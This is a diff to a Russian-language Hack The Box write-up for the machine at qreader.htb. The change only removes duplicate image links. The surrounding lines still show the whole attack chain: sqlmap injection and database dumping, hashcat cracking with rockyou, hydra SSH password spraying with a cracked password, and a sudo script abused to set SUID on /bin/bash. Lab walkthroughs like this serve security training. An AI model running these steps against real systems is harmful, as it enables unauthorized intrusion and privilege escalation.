@@ -103,8 +103,6 @@ Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Попробуем отправить запрос через браузер и перехватим его.
 
-![](1.png)
-
 ![](../assets/Soccer/1.png)
 
 Мы можем заметить в ответе, что нам доступны функции /update и /version.
@@ -113,19 +111,13 @@ Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Путем перебора параметров, мы можем заметить, что сервер дает в ответе версию.
 
-![](2.png)
-
 ![](../assets/Soccer/2.png)
 
 Попробуем отправить номер версии, который мы получили.
 
-![](3.png)
-
 ![](../assets/Soccer/3.png)
 
 Мы получили данные. Теперь же попробуем найти SQL Injection, отправив данную полезную нагрузку.
-
-![](4.png)
 
 ![](../assets/Soccer/4.png)
 
@@ -203,8 +195,6 @@ except KeyboardInterrupt:
 sqlmap -u http://localhost:8081/version?version=0.0.2 --batch -dbs
 ```
 
-![](5.png)
-
 ![](../assets/Soccer/5.png)
 
 Sqlmap успешно отработал. Попробуем вытащить пользовательские данные.
@@ -212,8 +202,6 @@ Sqlmap успешно отработал. Попробуем вытащить п
 ```
 sqlmap -u http://localhost:8081/version?version=0.0.2 --batch -dump
 ```
-
-![](6.png)
 
 ![](../assets/Soccer/6.png)
 
@@ -224,8 +212,6 @@ sqlmap -u http://localhost:8081/version?version=0.0.2 --batch -dump
 ```
 hashcat -m 0 hash --wordlist /usr/share/wordlists/rockyou.txt
 ```
-
-![](7.png)
 
 ![](../assets/Soccer/7.png)
 
@@ -253,8 +239,6 @@ admin
 hydra -L usernames.txt -p denjanjade122566 ssh://10.10.11.206
 ```
 
-![](8.png)
-
 ![](../assets/Soccer/8.png)
 
 Подключаемся по ssh.
@@ -265,13 +249,9 @@ hydra -L usernames.txt -p denjanjade122566 ssh://10.10.11.206
 
 Просмотрим права на выполнение командом **sudo -l**.
 
-![](9.png)
-
 ![](../assets/Soccer/9.png)
 
 Некий скрипт build-installer доступен нам для запуска от sudo. Просмотрим одержимое скрипта.
-
-![](10.png)
 
 ![](../assets/Soccer/10.png)
 
@@ -289,8 +269,6 @@ os.system('chmod +s /bin/bash')
 ```
 sudo /usr/local/sbin/build-installer.sh make 1.py
 ```
-
-![](11.png)
 
 ![](../assets/Soccer/11.png)
 
